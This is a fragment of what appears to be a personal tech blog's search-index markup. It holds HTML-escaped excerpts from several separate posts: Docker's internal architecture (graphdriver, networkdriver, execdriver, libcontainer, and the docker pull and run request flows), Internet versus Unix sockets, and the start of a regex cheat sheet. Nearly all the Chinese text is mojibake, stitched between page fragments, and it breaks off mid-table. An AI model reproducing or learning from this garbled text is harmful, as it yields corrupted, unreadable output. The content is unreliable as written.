&lt;p&gt;åŒæ—¶åœ¨ Graph çš„æœ¬åœ°ç›®å½•ä¸­ï¼Œå…³äºæ¯ä¸€ä¸ªçš„å®¹å™¨é•œåƒï¼Œå…·ä½“å­˜å‚¨çš„ä¿¡æ¯æœ‰ï¼šè¯¥å®¹å™¨é•œåƒçš„å…ƒæ•°æ®ï¼Œå®¹å™¨é•œåƒçš„å¤§å°ä¿¡æ¯ï¼Œä»¥åŠè¯¥å®¹å™¨é•œåƒæ‰€ä»£è¡¨çš„å…·ä½“ rootfsã€‚&lt;/p&gt;
&lt;h3 id=&#34;driver&#34;&gt;Driver&lt;/h3&gt;
&lt;p&gt;Driver æ˜¯ Docker æ¶æ„ä¸­çš„é©±åŠ¨æ¨¡å—ã€‚é€šè¿‡ Driver é©±åŠ¨ï¼ŒDocker å¯ä»¥å®ç°å¯¹ Docker å®¹å™¨æ‰§è¡Œç¯å¢ƒçš„å®šåˆ¶ã€‚ç”±äº Docker è¿è¡Œçš„ç”Ÿå‘½å‘¨æœŸä¸­ï¼Œå¹¶éç”¨æˆ·æ‰€æœ‰çš„æ“ä½œéƒ½æ˜¯é’ˆå¯¹ Docker å®¹å™¨çš„ç®¡ç†ï¼Œå¦å¤–è¿˜æœ‰å…³äº Docker è¿è¡Œä¿¡æ¯çš„è·å–ï¼ŒGraph çš„å­˜å‚¨ä¸è®°å½•ç­‰ã€‚å› æ­¤ï¼Œä¸ºäº†å°† Docker å®¹å™¨çš„ç®¡ç†ä» Docker Daemon å†…éƒ¨ä¸šåŠ¡é€»è¾‘ä¸­åŒºåˆ†å¼€æ¥ï¼Œè®¾è®¡äº† Driver å±‚é©±åŠ¨æ¥æ¥ç®¡æ‰€æœ‰è¿™éƒ¨åˆ†è¯·æ±‚ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨ Docker Driver çš„å®ç°ä¸­ï¼Œå¯ä»¥åˆ†ä¸ºä»¥ä¸‹ä¸‰ç±»é©±åŠ¨ï¼šgraphdriverã€networkdriver å’Œ execdriverã€‚&lt;/p&gt;
&lt;p&gt;graphdriver ä¸»è¦ç”¨äºå®Œæˆå®¹å™¨é•œåƒçš„ç®¡ç†ï¼ŒåŒ…æ‹¬å­˜å‚¨ä¸è·å–ã€‚å³å½“ç”¨æˆ·éœ€è¦ä¸‹è½½æŒ‡å®šçš„å®¹å™¨é•œåƒæ—¶ï¼Œgraphdriver å°†å®¹å™¨é•œåƒå­˜å‚¨åœ¨æœ¬åœ°çš„æŒ‡å®šç›®å½•ï¼›åŒæ—¶å½“ç”¨æˆ·éœ€è¦ä½¿ç”¨æŒ‡å®šçš„å®¹å™¨é•œåƒæ¥åˆ›å»ºå®¹å™¨çš„ rootfs æ—¶ï¼Œgraphdriver ä»æœ¬åœ°é•œåƒå­˜å‚¨ç›®å½•ä¸­è·å–æŒ‡å®šçš„å®¹å™¨é•œåƒã€‚&lt;/p&gt;
&lt;p&gt;åœ¨ graphdriver çš„åˆå§‹åŒ–è¿‡ç¨‹ä¹‹å‰ï¼Œæœ‰ 4 ç§æ–‡ä»¶ç³»ç»Ÿæˆ–ç±»æ–‡ä»¶ç³»ç»Ÿåœ¨å…¶å†…éƒ¨æ³¨å†Œï¼Œå®ƒä»¬åˆ†åˆ«æ˜¯ aufsã€btrfsã€vfs å’Œ devmapperã€‚è€Œ Docker åœ¨åˆå§‹åŒ–ä¹‹æ—¶ï¼Œé€šè¿‡è·å–ç³»ç»Ÿç¯å¢ƒå˜é‡â€DOCKER_DRIVERâ€æ¥æå–æ‰€ä½¿ç”¨ driver çš„æŒ‡å®šç±»å‹ã€‚è€Œä¹‹åæ‰€æœ‰çš„ graph æ“ä½œï¼Œéƒ½ä½¿ç”¨è¯¥ driver æ¥æ‰§è¡Œã€‚&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1626526448180.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;networkdriver çš„ç”¨é€”æ˜¯å®Œæˆ Docker å®¹å™¨ç½‘ç»œç¯å¢ƒçš„é…ç½®ï¼Œå…¶ä¸­åŒ…æ‹¬ Docker å¯åŠ¨æ—¶ä¸º Docker ç¯å¢ƒåˆ›å»ºç½‘æ¡¥ï¼›Docker å®¹å™¨åˆ›å»ºæ—¶ä¸ºå…¶åˆ›å»ºä¸“å±è™šæ‹Ÿç½‘å¡è®¾å¤‡ï¼›ä»¥åŠä¸º Docker å®¹å™¨åˆ†é… IPã€ç«¯å£å¹¶ä¸å®¿ä¸»æœºåšç«¯å£æ˜ å°„ï¼Œè®¾ç½®å®¹å™¨é˜²ç«å¢™ç­–ç•¥ç­‰ã€‚&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1626526455756.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;execdriver ä½œä¸º Docker å®¹å™¨çš„æ‰§è¡Œé©±åŠ¨ï¼Œè´Ÿè´£åˆ›å»ºå®¹å™¨è¿è¡Œå‘½åç©ºé—´ï¼Œè´Ÿè´£å®¹å™¨èµ„æºä½¿ç”¨çš„ç»Ÿè®¡ä¸é™åˆ¶ï¼Œè´Ÿè´£å®¹å™¨å†…éƒ¨è¿›ç¨‹çš„çœŸæ­£è¿è¡Œç­‰ã€‚åœ¨ execdriver çš„å®ç°è¿‡ç¨‹ä¸­ï¼ŒåŸå…ˆå¯ä»¥ä½¿ç”¨ LXC é©±åŠ¨è°ƒç”¨ LXC çš„æ¥å£ï¼Œæ¥æ“çºµå®¹å™¨çš„é…ç½®ä»¥åŠç”Ÿå‘½å‘¨æœŸï¼Œè€Œç°åœ¨ execdriver é»˜è®¤ä½¿ç”¨ native é©±åŠ¨ï¼Œä¸ä¾èµ–äº LXCã€‚å…·ä½“ä½“ç°åœ¨ Daemon å¯åŠ¨è¿‡ç¨‹ä¸­åŠ è½½çš„ ExecDriverflag å‚æ•°ï¼Œè¯¥å‚æ•°åœ¨é…ç½®æ–‡ä»¶å·²ç»è¢«è®¾ä¸º&amp;quot;native&amp;quot;ã€‚è¿™å¯ä»¥è®¤ä¸ºæ˜¯ Docker åœ¨ 1.2 ç‰ˆæœ¬ä¸Šä¸€ä¸ªå¾ˆå¤§çš„æ”¹å˜ï¼Œæˆ–è€…è¯´ Docker å®ç°è·¨å¹³å°çš„ä¸€ä¸ªå…ˆå…†ã€‚&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;6&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1626526471557.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;libcontainer&#34;&gt;libcontainer&lt;/h3&gt;
&lt;p&gt;libcontainer æ˜¯ Docker æ¶æ„ä¸­ä¸€ä¸ªä½¿ç”¨ Go è¯­è¨€è®¾è®¡å®ç°çš„åº“ï¼Œè®¾è®¡åˆè¡·æ˜¯å¸Œæœ›è¯¥åº“å¯ä»¥ä¸ä¾é ä»»ä½•ä¾èµ–ï¼Œç›´æ¥è®¿é—®å†…æ ¸ä¸­ä¸å®¹å™¨ç›¸å…³çš„ APIã€‚&lt;/p&gt;
&lt;p&gt;æ­£æ˜¯ç”±äº libcontainer çš„å­˜åœ¨ï¼ŒDocker å¯ä»¥ç›´æ¥è°ƒç”¨ libcontainerï¼Œè€Œæœ€ç»ˆæ“çºµå®¹å™¨çš„ namespaceã€cgroupsã€apparmorã€ç½‘ç»œè®¾å¤‡ä»¥åŠé˜²ç«å¢™è§„åˆ™ç­‰ã€‚è¿™ä¸€ç³»åˆ—æ“ä½œçš„å®Œæˆéƒ½ä¸éœ€è¦ä¾èµ– LXC æˆ–è€…å…¶ä»–åŒ…ã€‚&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;7&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1626526480319.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;å¦å¤–ï¼Œlibcontainer æä¾›äº†ä¸€æ•´å¥—æ ‡å‡†çš„æ¥å£æ¥æ»¡è¶³ä¸Šå±‚å¯¹å®¹å™¨ç®¡ç†çš„éœ€æ±‚ã€‚æˆ–è€…è¯´ï¼Œlibcontainer å±è”½äº† Docker ä¸Šå±‚å¯¹å®¹å™¨çš„ç›´æ¥ç®¡ç†ã€‚åˆç”±äº libcontainer ä½¿ç”¨ Go è¿™ç§è·¨å¹³å°çš„è¯­è¨€å¼€å‘å®ç°ï¼Œä¸”æœ¬èº«åˆå¯ä»¥è¢«ä¸Šå±‚å¤šç§ä¸åŒçš„ç¼–ç¨‹è¯­è¨€è®¿é—®ï¼Œå› æ­¤å¾ˆéš¾è¯´ï¼Œæœªæ¥çš„ Docker å°±ä¸€å®šä¼šç´§ç´§åœ°å’Œ Linux æ†ç»‘åœ¨ä¸€èµ·ã€‚è€Œäºæ­¤åŒæ—¶ï¼ŒMicrosoft åœ¨å…¶è‘—åäº‘è®¡ç®—å¹³å° Azure ä¸­ï¼Œä¹Ÿæ·»åŠ äº†å¯¹ Docker çš„æ”¯æŒï¼Œå¯è§ Docker çš„å¼€æ”¾ç¨‹åº¦ä¸ä¸šç•Œçš„ç«çƒ­åº¦ã€‚&lt;/p&gt;
&lt;p&gt;æš‚ä¸è°ˆ Dockerï¼Œç”±äº libcontainer çš„åŠŸèƒ½ä»¥åŠå…¶æœ¬èº«ä¸ç³»ç»Ÿçš„æ¾è€¦åˆç‰¹æ€§ï¼Œå¾ˆæœ‰å¯èƒ½ä¼šåœ¨å…¶ä»–ä»¥å®¹å™¨ä¸ºåŸå‹çš„å¹³å°å‡ºç°ï¼ŒåŒæ—¶ä¹Ÿå¾ˆæœ‰å¯èƒ½å‚¬ç”Ÿå‡ºäº‘è®¡ç®—é¢†åŸŸå…¨æ–°çš„é¡¹ç›®ã€‚&lt;/p&gt;
&lt;h3 id=&#34;docker-container&#34;&gt;Docker container&lt;/h3&gt;
&lt;p&gt;Docker containerï¼ˆDocker å®¹å™¨ï¼‰æ˜¯ Docker æ¶æ„ä¸­æœåŠ¡äº¤ä»˜çš„æœ€ç»ˆä½“ç°å½¢å¼ã€‚&lt;/p&gt;
&lt;p&gt;Docker æŒ‰ç…§ç”¨æˆ·çš„éœ€æ±‚ä¸æŒ‡ä»¤ï¼Œè®¢åˆ¶ç›¸åº”çš„ Docker å®¹å™¨ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ç”¨æˆ·é€šè¿‡æŒ‡å®šå®¹å™¨é•œåƒï¼Œä½¿å¾— Docker å®¹å™¨å¯ä»¥è‡ªå®šä¹‰ rootfs ç­‰æ–‡ä»¶ç³»ç»Ÿï¼›&lt;/li&gt;
&lt;li&gt;ç”¨æˆ·é€šè¿‡æŒ‡å®šè®¡ç®—èµ„æºçš„é…é¢ï¼Œä½¿å¾— Docker å®¹å™¨ä½¿ç”¨æŒ‡å®šçš„è®¡ç®—èµ„æºï¼›&lt;/li&gt;
&lt;li&gt;ç”¨æˆ·é€šè¿‡é…ç½®ç½‘ç»œåŠå…¶å®‰å…¨ç­–ç•¥ï¼Œä½¿å¾— Docker å®¹å™¨æ‹¥æœ‰ç‹¬ç«‹ä¸”å®‰å…¨çš„ç½‘ç»œç¯å¢ƒï¼›&lt;/li&gt;
&lt;li&gt;ç”¨æˆ·é€šè¿‡æŒ‡å®šè¿è¡Œçš„å‘½ä»¤ï¼Œä½¿å¾— Docker å®¹å™¨æ‰§è¡ŒæŒ‡å®šçš„å·¥ä½œã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;8&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1626526493283.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;docker-è¿è¡Œæ¡ˆä¾‹åˆ†æ&#34;&gt;Docker è¿è¡Œæ¡ˆä¾‹åˆ†æ&lt;/h2&gt;
&lt;h3 id=&#34;docker-pullå‘½ä»¤&#34;&gt;docker pullå‘½ä»¤&lt;/h3&gt;
&lt;p&gt;docker pull å‘½ä»¤çš„ä½œç”¨ä¸ºï¼šä» Docker Registry ä¸­ä¸‹è½½æŒ‡å®šçš„å®¹å™¨é•œåƒï¼Œå¹¶å­˜å‚¨åœ¨æœ¬åœ°çš„ Graph ä¸­ï¼Œä»¥å¤‡åç»­åˆ›å»º Docker å®¹å™¨æ—¶çš„ä½¿ç”¨ã€‚&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;9&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1626526502858.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;å¦‚å›¾ï¼Œå›¾ä¸­æ ‡è®°çš„çº¢è‰²ç®­å¤´è¡¨ç¤º docker pull å‘½ä»¤åœ¨å‘èµ·åï¼ŒDocker æ‰€åšçš„ä¸€ç³»åˆ—è¿è¡Œã€‚ä»¥ä¸‹é€ä¸€åˆ†æè¿™äº›æ­¥éª¤ã€‚&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Docker Client æ¥å— docker pull å‘½ä»¤ï¼Œè§£æå®Œè¯·æ±‚ä»¥åŠæ”¶é›†å®Œè¯·æ±‚å‚æ•°ä¹‹åï¼Œå‘é€ä¸€ä¸ª HTTP è¯·æ±‚ç»™ Docker Serverï¼ŒHTTP è¯·æ±‚æ–¹æ³•ä¸º POSTï¼Œè¯·æ±‚ URL ä¸º&amp;quot;/images/create? &amp;quot;+â€œxxxâ€ï¼›&lt;/li&gt;
&lt;li&gt;Docker Server æ¥å—ä»¥ä¸Š HTTP è¯·æ±‚ï¼Œå¹¶äº¤ç»™ mux.Routerï¼Œmux.Router é€šè¿‡ URL ä»¥åŠè¯·æ±‚æ–¹æ³•æ¥ç¡®å®šæ‰§è¡Œè¯¥è¯·æ±‚çš„å…·ä½“ handlerï¼›&lt;/li&gt;
&lt;li&gt;mux.Router å°†è¯·æ±‚è·¯ç”±åˆ†å‘è‡³ç›¸åº”çš„ handlerï¼Œå…·ä½“ä¸º PostImagesCreateï¼›&lt;/li&gt;
&lt;li&gt;åœ¨ PostImageCreate è¿™ä¸ª handler ä¹‹ä¸­ï¼Œä¸€ä¸ªåä¸º&amp;quot;pull&amp;quot;çš„ job è¢«åˆ›å»ºï¼Œå¹¶å¼€å§‹æ‰§è¡Œï¼›&lt;/li&gt;
&lt;li&gt;åä¸º&amp;quot;pull&amp;quot;çš„ job åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œæ‰§è¡Œ pullRepository æ“ä½œï¼Œå³ä» Docker Registry ä¸­ä¸‹è½½ç›¸åº”çš„ä¸€ä¸ªæˆ–è€…å¤šä¸ª imageï¼›&lt;/li&gt;
&lt;li&gt;åä¸º&amp;quot;pull&amp;quot;çš„ job å°†ä¸‹è½½çš„ image äº¤ç»™ graphdriverï¼›&lt;/li&gt;
&lt;li&gt;graphdriver è´Ÿè´£å°† image è¿›è¡Œå­˜å‚¨ï¼Œä¸€æ–¹åˆ›å»º graph å¯¹è±¡ï¼Œå¦ä¸€æ–¹é¢åœ¨ GraphDB ä¸­è®°å½• image ä¹‹é—´çš„å…³ç³»ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;docker-run&#34;&gt;docker run&lt;/h3&gt;
&lt;p&gt;docker run å‘½ä»¤çš„ä½œç”¨æ˜¯åœ¨ä¸€ä¸ªå…¨æ–°çš„ Docker å®¹å™¨å†…éƒ¨è¿è¡Œä¸€æ¡æŒ‡ä»¤ã€‚Docker åœ¨æ‰§è¡Œè¿™æ¡å‘½ä»¤çš„æ—¶å€™ï¼Œæ‰€åšå·¥ä½œå¯ä»¥åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼šç¬¬ä¸€ï¼Œåˆ›å»º Docker å®¹å™¨æ‰€éœ€çš„ rootfsï¼›ç¬¬äºŒï¼Œåˆ›å»ºå®¹å™¨çš„ç½‘ç»œç­‰è¿è¡Œç¯å¢ƒï¼Œå¹¶çœŸæ­£è¿è¡Œç”¨æˆ·æŒ‡ä»¤ã€‚å› æ­¤ï¼Œåœ¨æ•´ä¸ªæ‰§è¡Œæµç¨‹ä¸­ï¼ŒDocker Client ç»™ Docker Server å‘é€äº†ä¸¤æ¬¡ HTTP è¯·æ±‚ï¼Œç¬¬äºŒæ¬¡è¯·æ±‚çš„å‘èµ·å–å†³äºç¬¬ä¸€æ¬¡è¯·æ±‚çš„è¿”å›çŠ¶æ€ã€‚&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;10&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1626526513596.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;å¦‚å›¾ï¼Œå›¾ä¸­æ ‡è®°çš„çº¢è‰²ç®­å¤´è¡¨ç¤º docker run å‘½ä»¤åœ¨å‘èµ·åï¼ŒDocker æ‰€åšçš„ä¸€ç³»åˆ—è¿è¡Œã€‚ä»¥ä¸‹é€ä¸€åˆ†æè¿™äº›æ­¥éª¤ã€‚&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Docker Client æ¥å— docker run å‘½ä»¤ï¼Œè§£æå®Œè¯·æ±‚ä»¥åŠæ”¶é›†å®Œè¯·æ±‚å‚æ•°ä¹‹åï¼Œå‘é€ä¸€ä¸ª HTTP è¯·æ±‚ç»™ Docker Serverï¼ŒHTTP è¯·æ±‚æ–¹æ³•ä¸º POSTï¼Œè¯·æ±‚ URL ä¸º&amp;quot;/containers/create? &amp;quot;+â€œxxxâ€ï¼›&lt;/li&gt;
&lt;li&gt;Docker Server æ¥å—ä»¥ä¸Š HTTP è¯·æ±‚ï¼Œå¹¶äº¤ç»™ mux.Routerï¼Œmux.Router é€šè¿‡ URL ä»¥åŠè¯·æ±‚æ–¹æ³•æ¥ç¡®å®šæ‰§è¡Œè¯¥è¯·æ±‚çš„å…·ä½“ handlerï¼›&lt;/li&gt;
&lt;li&gt;mux.Router å°†è¯·æ±‚è·¯ç”±åˆ†å‘è‡³ç›¸åº”çš„ handlerï¼Œå…·ä½“ä¸º PostContainersCreateï¼›&lt;/li&gt;
&lt;li&gt;åœ¨ PostImageCreate è¿™ä¸ª handler ä¹‹ä¸­ï¼Œä¸€ä¸ªåä¸º&amp;quot;create&amp;quot;çš„ job è¢«åˆ›å»ºï¼Œå¹¶å¼€å§‹è®©è¯¥ job è¿è¡Œï¼›&lt;/li&gt;
&lt;li&gt;åä¸º&amp;quot;create&amp;quot;çš„ job åœ¨è¿è¡Œè¿‡ç¨‹ä¸­ï¼Œæ‰§è¡Œ Container.Create æ“ä½œï¼Œè¯¥æ“ä½œéœ€è¦è·å–å®¹å™¨é•œåƒæ¥ä¸º Docker å®¹å™¨åˆ›å»º rootfsï¼Œå³è°ƒç”¨ graphdriverï¼›&lt;/li&gt;
&lt;li&gt;graphdriver ä» Graph ä¸­è·å–åˆ›å»º Docker å®¹å™¨ rootfs æ‰€éœ€è¦çš„æ‰€æœ‰çš„é•œåƒï¼›&lt;/li&gt;
&lt;li&gt;graphdriver å°† rootfs æ‰€æœ‰é•œåƒï¼ŒåŠ è½½å®‰è£…è‡³ Docker å®¹å™¨æŒ‡å®šçš„æ–‡ä»¶ç›®å½•ä¸‹ï¼›&lt;/li&gt;
&lt;li&gt;è‹¥ä»¥ä¸Šæ“ä½œå…¨éƒ¨æ­£å¸¸æ‰§è¡Œï¼Œæ²¡æœ‰è¿”å›é”™è¯¯æˆ–å¼‚å¸¸ï¼Œåˆ™ Docker Client æ”¶åˆ° Docker Server è¿”å›çŠ¶æ€ä¹‹åï¼Œå‘èµ·ç¬¬äºŒæ¬¡ HTTP è¯·æ±‚ã€‚è¯·æ±‚æ–¹æ³•ä¸º&amp;quot;POST&amp;quot;ï¼Œè¯·æ±‚ URL ä¸º&amp;quot;/containers/&amp;quot;+container_ID+&amp;quot;/start&amp;quot;ï¼›&lt;/li&gt;
&lt;li&gt;Docker Server æ¥å—ä»¥ä¸Š HTTP è¯·æ±‚ï¼Œå¹¶äº¤ç»™ mux.Routerï¼Œmux.Router é€šè¿‡ URL ä»¥åŠè¯·æ±‚æ–¹æ³•æ¥ç¡®å®šæ‰§è¡Œè¯¥è¯·æ±‚çš„å…·ä½“ handlerï¼›ã€&lt;/li&gt;
&lt;li&gt;mux.Router å°†è¯·æ±‚è·¯ç”±åˆ†å‘è‡³ç›¸åº”çš„ handlerï¼Œå…·ä½“ä¸º PostContainersStartï¼›&lt;/li&gt;
&lt;li&gt;åœ¨ PostContainersStart è¿™ä¸ª handler ä¹‹ä¸­ï¼Œåä¸º&amp;quot;start&amp;quot;çš„ job è¢«åˆ›å»ºï¼Œå¹¶å¼€å§‹æ‰§è¡Œï¼›&lt;/li&gt;
&lt;li&gt;åä¸º&amp;quot;start&amp;quot;çš„ job æ‰§è¡Œå®Œåˆæ­¥çš„é…ç½®å·¥ä½œåï¼Œå¼€å§‹é…ç½®ä¸åˆ›å»ºç½‘ç»œç¯å¢ƒï¼Œè°ƒç”¨ networkdriverï¼›&lt;/li&gt;
&lt;li&gt;networkdriver éœ€è¦ä¸ºæŒ‡å®šçš„ Docker å®¹å™¨åˆ›å»ºç½‘ç»œæ¥å£è®¾å¤‡ï¼Œå¹¶ä¸ºå…¶åˆ†é… IPï¼Œportï¼Œä»¥åŠè®¾ç½®é˜²ç«å¢™è§„åˆ™ï¼Œç›¸åº”çš„æ“ä½œè½¬äº¤è‡³ libcontainer ä¸­çš„ netlink åŒ…æ¥å®Œæˆï¼›&lt;/li&gt;
&lt;li&gt;netlink å®Œæˆ Docker å®¹å™¨çš„ç½‘ç»œç¯å¢ƒé…ç½®ä¸åˆ›å»ºï¼›&lt;/li&gt;
&lt;li&gt;è¿”å›è‡³åä¸º&amp;quot;start&amp;quot;çš„ jobï¼Œæ‰§è¡Œå®Œä¸€äº›è¾…åŠ©æ€§æ“ä½œåï¼Œjob å¼€å§‹æ‰§è¡Œç”¨æˆ·æŒ‡ä»¤ï¼Œè°ƒç”¨ execdriverï¼›&lt;/li&gt;
&lt;li&gt;execdriver è¢«è°ƒç”¨ï¼Œåˆå§‹åŒ– Docker å®¹å™¨å†…éƒ¨çš„è¿è¡Œç¯å¢ƒï¼Œå¦‚å‘½åç©ºé—´ï¼Œèµ„æºæ§åˆ¶ä¸éš”ç¦»ï¼Œä»¥åŠç”¨æˆ·å‘½ä»¤çš„æ‰§è¡Œï¼Œç›¸åº”çš„æ“ä½œè½¬äº¤è‡³ libcontainer æ¥å®Œæˆï¼›&lt;/li&gt;
&lt;li&gt;libcontainer è¢«è°ƒç”¨ï¼Œå®Œæˆ Docker å®¹å™¨å†…éƒ¨çš„è¿è¡Œç¯å¢ƒåˆå§‹åŒ–ï¼Œå¹¶æœ€ç»ˆæ‰§è¡Œç”¨æˆ·è¦æ±‚å¯åŠ¨çš„å‘½ä»¤ã€‚&lt;/li&gt;
&lt;/ol&gt;
">ã€å®¹å™¨ã€‘Docker æºç æ¶æ„</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/internetunix-socket/"" data-c="
          &lt;p&gt;socketæ˜¯è®¡ç®—æœºä¹‹é—´è¿›è¡Œé€šä¿¡çš„ä¸€ç§çº¦å®šæˆ–ä¸€ç§æ–¹å¼ã€‚é€šè¿‡ socket è¿™ç§çº¦å®šï¼Œä¸€å°è®¡ç®—æœºå¯ä»¥æ¥æ”¶å…¶ä»–è®¡ç®—æœºçš„æ•°æ®ï¼Œä¹Ÿå¯ä»¥å‘å…¶ä»–è®¡ç®—æœºå‘é€æ•°æ®ã€‚socketå®ç°äº†ç½‘ç»œåè®®æ ˆçš„ç½‘ç»œå±‚å’Œä¼ è¾“å±‚ã€‚&lt;/p&gt;
&lt;p&gt;UNIX/Linux ä¸­çš„ä¸€åˆ‡éƒ½æ˜¯æ–‡ä»¶ï¼Œä¸ºäº†ç»Ÿä¸€å¯¹å„ç§ç¡¬ä»¶çš„æ“ä½œï¼Œç®€åŒ–æ¥å£ï¼Œä¸åŒçš„ç¡¬ä»¶è®¾å¤‡ä¹Ÿéƒ½è¢«çœ‹æˆä¸€ä¸ªæ–‡ä»¶ã€‚å¯¹è¿™äº›æ–‡ä»¶çš„æ“ä½œï¼Œç­‰åŒäºå¯¹ç£ç›˜ä¸Šæ™®é€šæ–‡ä»¶çš„æ“ä½œã€‚&lt;/p&gt;
&lt;p&gt;ä¸ºäº†è¡¨ç¤ºå’ŒåŒºåˆ†å·²ç»æ‰“å¼€çš„æ–‡ä»¶ï¼ŒUNIX/Linux ä¼šç»™æ¯ä¸ªæ–‡ä»¶åˆ†é…ä¸€ä¸ª IDï¼Œè¿™ä¸ª ID å°±æ˜¯ä¸€ä¸ªæ•´æ•°ï¼Œè¢«ç§°ä¸ºæ–‡ä»¶æè¿°ç¬¦ï¼ˆFile Descriptorï¼‰ã€‚ä¾‹å¦‚ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;é€šå¸¸ç”¨ 0 æ¥è¡¨ç¤ºæ ‡å‡†è¾“å…¥æ–‡ä»¶ï¼ˆstdinï¼‰ï¼Œå®ƒå¯¹åº”çš„ç¡¬ä»¶è®¾å¤‡å°±æ˜¯é”®ç›˜ï¼›&lt;/li&gt;
&lt;li&gt;é€šå¸¸ç”¨ 1 æ¥è¡¨ç¤ºæ ‡å‡†è¾“å‡ºæ–‡ä»¶ï¼ˆstdoutï¼‰ï¼Œå®ƒå¯¹åº”çš„ç¡¬ä»¶è®¾å¤‡å°±æ˜¯æ˜¾ç¤ºå™¨ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;UNIX/Linux ç¨‹åºåœ¨æ‰§è¡Œä»»ä½•å½¢å¼çš„ I/O æ“ä½œæ—¶ï¼Œéƒ½æ˜¯åœ¨è¯»å–æˆ–è€…å†™å…¥ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ã€‚ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦åªæ˜¯ä¸€ä¸ªå’Œæ‰“å¼€çš„æ–‡ä»¶ç›¸å…³è”çš„æ•´æ•°ï¼Œå®ƒçš„èƒŒåå¯èƒ½æ˜¯ä¸€ä¸ªç¡¬ç›˜ä¸Šçš„æ™®é€šæ–‡ä»¶ã€FIFOã€ç®¡é“ã€ç»ˆç«¯ã€é”®ç›˜ã€æ˜¾ç¤ºå™¨ï¼Œç”šè‡³æ˜¯ä¸€ä¸ªç½‘ç»œè¿æ¥ã€‚&lt;/p&gt;
&lt;p&gt;é€šè¿‡ socket() å‡½æ•°å¯ä»¥åˆ›å»ºä¸€ä¸ªç½‘ç»œè¿æ¥ï¼Œæˆ–è€…è¯´æ‰“å¼€ä¸€ä¸ªç½‘ç»œæ–‡ä»¶ï¼Œsocket() çš„è¿”å›å€¼å°±æ˜¯æ–‡ä»¶æè¿°ç¬¦ã€‚å‰©ä¸‹çš„æ“ä½œå°±æ˜¯å¯¹è¿™ä¸ªæ–‡ä»¶çš„æ“ä½œäº†ã€‚&lt;/p&gt;
&lt;p&gt;Internetå¥—æ¥å­—ç”¨äºç½‘ç»œä¸Šä¸¤ä¸ªä¸»æœºä¹‹é—´çš„äº¤äº’ï¼ŒUnixå¥—æ¥å­—ç”¨äºå•ä¸ªä¸»æœºä¸Šä¸¤ä¸ªè¿›ç¨‹ä¹‹é—´çš„äº¤äº’ã€‚&lt;/p&gt;
&lt;p&gt;Internet socketé€šè¿‡ç›‘å¬ipå’Œç«¯å£å·ï¼Œè€ŒUnix socketæ˜¯é€šè¿‡ç›‘å¬socketç±»å‹çš„æ–‡ä»¶åœ¨æ–‡ä»¶ç³»ç»Ÿä¸Šçš„è·¯å¾„ã€‚&lt;/p&gt;
&lt;p&gt;ä¸¤ç§ä¼ è¾“æ–¹å¼ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;SOCK_STREAM&lt;br&gt;
ä¼ è¾“å±‚ä½¿ç”¨TCPè¿æ¥ï¼Œå¯é ã€æŒ‰åºã€å¼‚æ­¥&lt;/li&gt;
&lt;li&gt;SOCK_DGRAM&lt;br&gt;
ä¼ è¾“å±‚ä½¿ç”¨UDPè¿æ¥ï¼Œå¿«é€Ÿã€éé¡ºåºã€åŒæ­¥&lt;/li&gt;
&lt;/ul&gt;
">Internet/Unix socket</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/zheng-ze-biao-da-shi-su-cha-biao/"" data-c="
          &lt;h3 id=&#34;åŸºæœ¬è¯­æ³•&#34;&gt;åŸºæœ¬è¯­æ³•&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;reg&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;\&lt;/td&gt;
